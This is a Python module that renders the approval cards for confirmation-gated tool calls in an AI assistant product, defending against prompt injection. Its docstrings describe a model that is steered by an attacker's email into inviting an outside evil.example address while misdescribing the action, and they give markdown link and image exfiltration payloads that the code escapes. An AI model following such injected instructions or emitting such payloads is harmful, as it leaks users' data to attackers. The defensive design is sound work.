"""What the user is shown when a chat action pauses for their approval.

A write tool registered as ``FunctionTool(..., require_confirmation=True)``
stops the turn before it runs, and the user answers yes or no. What they read
at that moment used to be a canned sentence ("Would you like me to go ahead and
book this slot?") plus whatever the model chose to say. A model that has read
an attacker's email will not describe the attacker's action honestly: it calls
``calendar_create_event(attendees=["x@evil.example"], description=<the
pipeline>)`` and asks "shall I book it?". So the server renders the
confirmation from the arguments ADK actually paused on, and that rendering is
the only thing the user approves (docs/prompt_injection_hardening.md, P1).

Each renderer turns one tool's arguments into labelled fields, plus warnings
for consequences a person might not expect: an invitation emailed outside
the company, a standing instruction that runs with nobody watching. A tool
with no renderer falls back to every argument, so a newly armed tool is never
approved from an empty card.
"""

from __future__ import annotations

import json
import logging
import re
from collections.abc import Callable, Iterable
from dataclasses import dataclass, field
from datetime import datetime
from email.utils import parseaddr
from typing import Any

from rubik_core.brand import PRODUCT_NAME

logger = logging.getLogger(__name__)

# The fallback shows every argument but cuts a very long one, and says so. The
# dedicated renderers show their text in full: it is what is being approved.
_FALLBACK_VALUE_LIMIT = 2000

# Argument names whose values are addresses. The fallback never cuts these and
# checks them for outside recipients.
_RECIPIENT_KEY_RE = re.compile(r"attendee|recipient|email|^to$|^cc$|^bcc$", re.I)

_UNATTENDED_WARNING = (
    "Each run reads your email, calendar, HubSpot, Slack and the knowledge base "
    "as you, with nobody watching, and can leave drafts in your Gmail. Approve "
    "only an instruction you asked for."
)


@dataclass(frozen=True)
class RenderContext:
    """Who is approving. Two renderers look something up with it: a scheduled
    task's name, and the timezone its schedule is read in."""

    user_email: str | None = None
    timezone: str = "UTC"


@dataclass(frozen=True)
class ConfirmationField:
    label: str
    value: str


@dataclass
class ConfirmationView:
    tool: str
    title: str
    fields: list[ConfirmationField] = field(default_factory=list)
    warnings: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "tool": self.tool,
            "title": self.title,
            "fields": [{"label": f.label, "value": f.value} for f in self.fields],
            "warnings": list(self.warnings),
        }


# ── outside recipients ──────────────────────────────────────────────────────


def internal_domains() -> tuple[str, ...]:
    """Only this workspace's verified domains count as internal."""
    from rubik_core.company.domain import workspace_domains

    return tuple(sorted(workspace_domains()))


def external_addresses(addresses: Iterable[str]) -> list[str]:
    """The entries of ``addresses`` outside the company, as written, in order.

    An entry that is not exactly one address counts as outside: the card must
    never call something it cannot read internal, and "b@acme.example,
    a@evil.example" in one string would otherwise pass on its first address.
    """
    internal = internal_domains()
    out: list[str] = []
    for raw in addresses:
        text = str(raw or "").strip()
        if not text:
            continue
        _, addr = parseaddr(text)
        domain = addr.rpartition("@")[2].lower() if addr.count("@") == 1 else ""
        if (
            text.count("@") == 1
            and domain
            and any(domain == d or domain.endswith("." + d) for d in internal)
        ):
            continue
        out.append(text)
    return out


def _company() -> str:
    """The company's name from its profile, or "your company" (spec §4.1)."""
    from rubik_core.company.profile import company_name_for_copy

    return company_name_for_copy()


def _outside_warning(external: list[str], what: str) -> str:
    people = "person" if len(external) == 1 else "people"
    return (
        f"{what} {len(external)} {people} outside {_company()}: {', '.join(external)}."
    )


# ── value helpers ───────────────────────────────────────────────────────────


def _text(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, str):
        return value.strip()
    return json.dumps(value, ensure_ascii=False, default=str)


def _as_list(value: Any) -> list[str]:
    """A list argument as strings. A model sometimes sends one comma-joined
    string instead of a list; each piece is shown (and checked) on its own."""
    if value is None or value == "":
        return []
    if isinstance(value, str):
        return [p.strip() for p in re.split(r"[,;]", value) if p.strip()]
    if isinstance(value, (list, tuple, set)):
        return [_text(v) for v in value if _text(v)]
    return [_text(value)]


def _truthy(value: Any) -> bool:
    if isinstance(value, str):
        return value.strip().lower() in {"true", "1", "yes"}
    return bool(value)


def _when(value: Any) -> str:
    """An ISO timestamp as a person reads it, keeping its offset; as given if
    it does not parse (the tool will refuse it, and the card shows why)."""
    raw = _text(value)
    try:
        moment = datetime.fromisoformat(raw.replace("Z", "+00:00"))
    except ValueError:
        return raw or "(not given)"
    hour = moment.strftime("%I:%M %p").lstrip("0")
    out = f"{moment.strftime('%A, %B')} {moment.day}, {moment.year}, {hour}"
    offset = moment.strftime("%z")
    if offset:
        out += f" (UTC{offset[:3]}:{offset[3:]})"
    return out


def _humanize(value: Any) -> str:
    return _text(value).replace("_", " ").capitalize()


def _fallback_value(key: str, value: Any) -> str:
    text = "\n".join(_as_list(value)) if _RECIPIENT_KEY_RE.search(key) else _text(value)
    if len(text) > _FALLBACK_VALUE_LIMIT and not _RECIPIENT_KEY_RE.search(key):
        cut = len(text) - _FALLBACK_VALUE_LIMIT
        text = f"{text[:_FALLBACK_VALUE_LIMIT]}\n… ({cut} more characters not shown)"
    return text or "(empty)"


# ── renderers ───────────────────────────────────────────────────────────────


def _calendar_create_event(args: dict, ctx: RenderContext) -> ConfirmationView:
    attendees = _as_list(args.get("attendees"))
    description = _text(args.get("description"))
    fields = [
        ConfirmationField("Title", _text(args.get("summary")) or "(no title)"),
        ConfirmationField("Starts", _when(args.get("start_time"))),
        ConfirmationField("Ends", _when(args.get("end_time"))),
        ConfirmationField(
            "Invites",
            "\n".join(attendees)
            if attendees
            else "Nobody. It goes on your calendar only.",
        ),
    ]
    if description:
        fields.append(ConfirmationField("Description", description))
    warnings = []
    external = external_addresses(attendees)
    if external:
        shown = "title and description" if description else "title"
        warnings.append(
            _outside_warning(
                external, f"Google emails an invitation with the {shown} to"
            )
        )
    return ConfirmationView(
        "calendar_create_event", "Book a calendar event", fields, warnings
    )


def _scheduled_task_name(task_id: str, ctx: RenderContext) -> str:
    """The task's name and id, or the id alone when it cannot be looked up."""
    if not task_id or not ctx.user_email:
        return task_id or "(not given)"
    try:
        from rubik_core.database.db import SessionLocal
        from rubik_core.scheduled_tasks import store

        with SessionLocal() as db:
            task = store.get_task_for_user(db, task_id, ctx.user_email)
            if task is not None:
                return f"{task.title}\n{task_id}"
    except Exception:  # noqa: BLE001 — the id alone still identifies it
        logger.debug("confirmation: scheduled task lookup failed", exc_info=True)
    return task_id


def _schedule_words(args: dict, ctx: RenderContext) -> str:
    """The schedule in plain words, read in the same timezone the tool will
    use; the arguments as given when they do not validate (the tool refuses
    those, so nothing is created)."""
    from rubik_core.scheduled_tasks import schedule as sched

    tz_name = ctx.timezone or "UTC"
    if ctx.user_email:
        try:
            from rubik_core.tools.scheduled_tasks_tools import ScheduledTaskChatTools

            # The tool's own rule: a saved Settings timezone beats the browser's.
            tz_name = ScheduledTaskChatTools(
                user_email=ctx.user_email, user_timezone=tz_name
            )._resolve_timezone()
        except Exception:  # noqa: BLE001 — the browser's zone is its fallback too
            logger.debug("confirmation: timezone lookup failed", exc_info=True)
    try:
        spec = sched.validate_schedule(
            schedule_kind=_text(args.get("schedule_kind")),
            timezone_name=tz_name,
            time_local=_text(args.get("time_local")) or "08:00",
            days_of_week=args.get("days_of_week"),
            day_of_month=args.get("day_of_month"),
            run_at_local=_text(args.get("run_at_local")),
        )
        return sched.describe_schedule(spec)
    except Exception as exc:  # noqa: BLE001
        given = ", ".join(
            f"{k}={_text(args.get(k))}"
            for k in ("schedule_kind", "time_local", "days_of_week", "day_of_month")
            if _text(args.get(k))
        )
        return (
            f"{given or '(not given)'} "
            f"({PRODUCT_NAME} could not read this schedule: {exc})"
        )


def _delivery_words(args: dict) -> str:
    where = ["your chat"]
    if args.get("deliver_by_slack") is None or _truthy(args.get("deliver_by_slack")):
        where.append("a Slack DM")
    if _truthy(args.get("deliver_by_email")):
        where.append("email")
    return ", ".join(where[:-1]) + f" and {where[-1]}" if len(where) > 1 else where[0]


def _create_scheduled_task(args: dict, ctx: RenderContext) -> ConfirmationView:
    fields = [
        ConfirmationField("Name", _text(args.get("title")) or "(no name)"),
        ConfirmationField("Runs", _schedule_words(args, ctx)),
        ConfirmationField("Instruction", _text(args.get("prompt")) or "(empty)"),
        ConfirmationField("Results go to", _delivery_words(args)),
    ]
    return ConfirmationView(
        "create_scheduled_task",
        f"Schedule a task {PRODUCT_NAME} runs on its own",
        fields,
        [_UNATTENDED_WARNING],
    )


def _update_scheduled_task(args: dict, ctx: RenderContext) -> ConfirmationView:
    fields = [
        ConfirmationField("Task", _scheduled_task_name(_text(args.get("task_id")), ctx))
    ]
    if _text(args.get("title")):
        fields.append(ConfirmationField("New name", _text(args.get("title"))))
    if _text(args.get("schedule_kind")):
        fields.append(
            ConfirmationField("New cadence", _humanize(args.get("schedule_kind")))
        )
    if _text(args.get("time_local")):
        fields.append(ConfirmationField("New time", _text(args.get("time_local"))))
    if args.get("days_of_week"):
        from rubik_core.scheduled_tasks.schedule import WEEKDAY_NAMES

        try:
            days = ", ".join(WEEKDAY_NAMES[int(d)] for d in args["days_of_week"])
        except (TypeError, ValueError, IndexError):
            days = _text(args.get("days_of_week"))
        fields.append(ConfirmationField("New days", days))
    if args.get("day_of_month"):
        fields.append(
            ConfirmationField("New day of the month", _text(args.get("day_of_month")))
        )
    warnings = []
    if _text(args.get("prompt")):
        fields.append(ConfirmationField("New instruction", _text(args.get("prompt"))))
        warnings.append(_UNATTENDED_WARNING)
    if len(fields) == 1:
        fields.append(ConfirmationField("Changes", "None given"))
    return ConfirmationView(
        "update_scheduled_task", "Change a scheduled task", fields, warnings
    )


def _delete_scheduled_task(args: dict, ctx: RenderContext) -> ConfirmationView:
    return ConfirmationView(
        "delete_scheduled_task",
        "Delete a scheduled task",
        [
            ConfirmationField(
                "Task", _scheduled_task_name(_text(args.get("task_id")), ctx)
            )
        ],
        ["Deleted for good: it never runs again. Pausing it instead can be undone."],
    )


# ── meeting skills ──────────────────────────────────────────────────────────

_MEETING_DELIVERY = {
    "chat": "Chat only",
    "email_draft_to_me": "Chat, plus a Gmail draft to you",
    "email_draft_to_attendees": (
        "Chat, plus a Gmail draft to the other attendees (you review and send it)"
    ),
}


def _outline_words(sections: Any) -> str:
    """The sections as the person approves them: what the tool will save."""
    from rubik_core.meeting_skills.sections import (
        SectionsError,
        describe_sections,
        parse_sections,
    )

    try:
        return describe_sections(parse_sections(_text(sections)))
    except SectionsError as exc:
        return f"{_text(sections)}\n({PRODUCT_NAME} cannot read this outline: {exc})"


def _save_meeting_template(args: dict, ctx: RenderContext) -> ConfirmationView:
    made_from = {
        "attachment": "Copied from the file you attached",
        "answer": "From an earlier write-up",
    }.get(_text(args.get("made_from")), "Written from your request")
    fields = [
        ConfirmationField("Name", _text(args.get("name")) or "(no name)"),
        ConfirmationField("Sections", _outline_words(args.get("sections"))),
        ConfirmationField("Made from", made_from),
    ]
    if _text(args.get("description")):
        fields.insert(
            1, ConfirmationField("Use it for", _text(args.get("description")))
        )
    return ConfirmationView(
        "save_meeting_template",
        "Save a meeting template",
        fields,
        ["Saving under a name you already have replaces it with this version."],
    )


def _save_meeting_skill(args: dict, ctx: RenderContext) -> ConfirmationView:
    from rubik_core.meeting_skills.store import slugify

    name = _text(args.get("name"))
    fields = [
        ConfirmationField(
            "Name", f"{name} (type /{slugify(name)} to run it)" if name else "(no name)"
        ),
        ConfirmationField("Instructions", _text(args.get("instructions")) or "(empty)"),
    ]
    if _text(args.get("template")):
        fields.append(
            ConfirmationField(
                "Outline", f"Your template “{_text(args.get('template'))}”"
            )
        )
    elif _text(args.get("sections")):
        fields.append(
            ConfirmationField("Outline", _outline_words(args.get("sections")))
        )
    else:
        fields.append(ConfirmationField("Outline", "The general meeting outline"))
    if _text(args.get("tone")):
        fields.append(ConfirmationField("Tone", _text(args.get("tone"))))
    fields.append(
        ConfirmationField("Detail", _humanize(args.get("detail") or "standard"))
    )
    if _text(args.get("meetings")) == "many":
        days = _text(args.get("window_days")) or "7"
        fields.append(
            ConfirmationField("Covers", f"Every meeting from the last {days} days")
        )
    else:
        fields.append(ConfirmationField("Covers", "One meeting at a time"))
    deliver = _text(args.get("deliver_as")) or "chat"
    fields.append(
        ConfirmationField("Results go to", _MEETING_DELIVERY.get(deliver, deliver))
    )
    if args.get("exclude_personal") is not None and not _truthy(
        args.get("exclude_personal")
    ):
        fields.append(ConfirmationField("Personal matters", "Kept in"))
    warnings = ["Saving under a name you already have replaces it with this version."]
    if deliver == "email_draft_to_attendees":
        warnings.append(
            "Each run leaves a Gmail draft addressed to the meeting's other "
            f"attendees, which can include people outside {_company()}. "
            f"{PRODUCT_NAME} never sends it; you do."
        )
    return ConfirmationView(
        "save_meeting_skill", "Save a meeting skill", fields, warnings
    )


def _create_meeting_routine(args: dict, ctx: RenderContext) -> ConfirmationView:
    skill = _text(args.get("skill")).lstrip("/")
    when = ["Whenever a transcript of a meeting you attended is ready"]
    if _text(args.get("title_contains")):
        when.append(f"and its title contains “{_text(args.get('title_contains'))}”")
    if _truthy(args.get("external_only")):
        when.append(f"and someone from outside {_company()} was invited")
    where = "Your chat (the “Scheduled tasks” folder)"
    if args.get("deliver_by_slack") is None or _truthy(args.get("deliver_by_slack")):
        where += " and a Slack DM"
    fields = [
        ConfirmationField("Name", _text(args.get("name")) or f"/{skill}"),
        ConfirmationField("Runs", f"/{skill}"),
        ConfirmationField("When", " ".join(when)),
        ConfirmationField("Results go to", where),
    ]
    return ConfirmationView(
        "create_meeting_routine",
        "Run a meeting skill on its own",
        fields,
        [
            f"Each time, {PRODUCT_NAME} reads that meeting's transcript as you, with nobody "
            "watching. It can leave Gmail drafts but never sends anything."
        ],
    )


def _delete_meeting(kind: str, tool: str, key: str, extra: str = ""):
    def render(args: dict, ctx: RenderContext) -> ConfirmationView:
        return ConfirmationView(
            tool,
            f"Delete a meeting {kind}",
            [ConfirmationField(kind.capitalize(), _text(args.get(key)) or "(none)")],
            [f"Deleted for good.{extra}"],
        )

    return render


def _fallback(tool_name: str, args: dict) -> ConfirmationView:
    fields = [
        ConfirmationField(key.replace("_", " ").capitalize(), _fallback_value(key, v))
        for key, v in args.items()
    ] or [ConfirmationField("Details", "(none)")]
    recipients = [
        a
        for key, v in args.items()
        if _RECIPIENT_KEY_RE.search(key)
        for a in _as_list(v)
    ]
    external = external_addresses(recipients)
    warnings = [_outside_warning(external, "This goes to")] if external else []
    return ConfirmationView(
        tool_name or "unknown",
        f"Run {(tool_name or 'an action').replace('_', ' ')}",
        fields,
        warnings,
    )


_RENDERERS: dict[str, Callable[[dict, RenderContext], ConfirmationView]] = {
    "calendar_create_event": _calendar_create_event,
    "create_scheduled_task": _create_scheduled_task,
    "update_scheduled_task": _update_scheduled_task,
    "delete_scheduled_task": _delete_scheduled_task,
    "save_meeting_template": _save_meeting_template,
    "delete_meeting_template": _delete_meeting(
        "template",
        "delete_meeting_template",
        "name",
        " Skills that used it switch to the general outline.",
    ),
    "save_meeting_skill": _save_meeting_skill,
    "delete_meeting_skill": _delete_meeting(
        "skill", "delete_meeting_skill", "name", " Any routine that runs it goes too."
    ),
    "create_meeting_routine": _create_meeting_routine,
    "delete_meeting_routine": _delete_meeting(
        "routine",
        "delete_meeting_routine",
        "name",
        " Pausing it instead can be undone.",
    ),
}


def has_renderer(tool_name: str) -> bool:
    return tool_name in _RENDERERS


def render_confirmation(
    tool_name: str, args: dict[str, Any] | None, ctx: RenderContext | None = None
) -> ConfirmationView:
    """The approval card for one paused call. Never raises: a renderer that
    fails falls back to showing every argument."""
    args = dict(args or {})
    ctx = ctx or RenderContext()
    renderer = _RENDERERS.get(tool_name)
    if renderer is not None:
        try:
            return renderer(args, ctx)
        except Exception:  # noqa: BLE001 — the raw arguments are still the truth
            logger.exception("confirmation: renderer for %s failed", tool_name)
    return _fallback(tool_name, args)


# ── the payload and the text ────────────────────────────────────────────────


def confirmation_payload(views: list[ConfirmationView]) -> dict[str, Any]:
    """What the Chat page draws as the approval card."""
    return {"actions": [v.to_dict() for v in views]}


_MD_SPECIAL = re.compile(r"([\\`*_{}\[\]()#+\-.!|<>~])")


def _md_escape(text: str) -> str:
    return _MD_SPECIAL.sub(r"\\\1", text)


def _md_literal(value: str) -> str:
    """``value`` as markdown that shows exactly as written.

    The values are the model's arguments, so an attacker may have written
    them: ``[open](https://evil)`` or ``![](https://evil/?d=…)`` must read as
    text, never become a link or an image. One line goes in a code span,
    several in a fenced block; either is longer than any backtick run inside.
    """
    longest = max((len(m) for m in re.findall(r"`+", value)), default=0)
    if "\n" in value:
        fence = "`" * max(3, longest + 1)
        return f"\n{fence}text\n{value}\n{fence}"
    ticks = "`" * (longest + 1)
    pad = " " if value.startswith("`") or value.endswith("`") else ""
    return f"{ticks}{pad}{value}{pad}{ticks}"


def confirmation_markdown(views: list[ConfirmationView]) -> str:
    """The same card as text: the saved answer, and what the model reads back
    as this turn in the next turn's history."""
    if len(views) == 1:
        blocks = [f"**{PRODUCT_NAME} needs your OK before it does this.**"]
    else:
        blocks = [
            f"**{PRODUCT_NAME} needs your OK before it does these "
            f"{len(views)} things.**"
        ]
    for view in views:
        blocks.append(f"**{_md_escape(view.title)}**")
        blocks.extend(f"⚠️ {_md_escape(w)}" for w in view.warnings)
        blocks.extend(
            f"**{_md_escape(f.label)}:** {_md_literal(f.value)}" for f in view.fields
        )
    blocks.append("Reply **yes** to go ahead, or **no** to cancel.")
    return "\n\n".join(blocks)
